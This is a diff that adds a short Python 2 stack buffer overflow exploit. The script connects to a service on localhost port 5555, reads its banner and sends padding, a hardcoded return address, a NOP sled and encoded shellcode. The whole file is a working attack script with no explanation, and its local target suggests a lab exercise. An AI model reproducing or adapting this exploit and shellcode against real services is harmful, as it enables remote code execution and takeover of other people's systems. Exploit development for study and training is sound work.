@@ -1,0 +1,31 @@
+#!/usr/bin/python
+import socket
+
+total = 1024                    # Total Length of Buffer String
+off = 264
+
+sc = ""
+sc += "\xb8\x7a\x9c\x2a\xd0\xda\xca\xd9\x74\x24\xf4\x5b\x31"
+sc += "\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x91\x60\xc8"
+sc += "\x25\x54\x42\xfa\x25\xc5\x37\x56\xc0\xeb\x3e\xb9\xa4"
+sc += "\x8d\x8d\xba\x56\x08\xbe\x84\x95\x2a\xf7\x83\xdc\x42"
+sc += "\xc8\xdc\xdf\x52\xa0\x1e\xe0\x73\xd2\x96\x01\xc3\x72"
+sc += "\xf9\x90\x70\xc8\xfa\x9b\x97\xe3\x7d\xc9\x3f\x92\x52"
+sc += "\x9d\xd7\x02\x82\x4e\x45\xba\x55\x73\xdb\x6f\xef\x95"
+sc += "\x6b\x84\x22\xd5"
+
+
+
+noplen = 32
+jmp = "\x78\xf3\xff\xbf"        # NOP sled address
+
+s = socket.socket()
+s.connect(("localhost", 5555))  # Connect to server
+print s.recv(1024)              # Recieve Banner
+
+exploit = ""                    # Build Exploit String
+exploit += "A"*off + jmp + "\x90"*noplen + sc
+exploit +="C"*(total-off-4-len(sc)-noplen)
+
+s.send(exploit)                 # Send Exploit String
+s.close
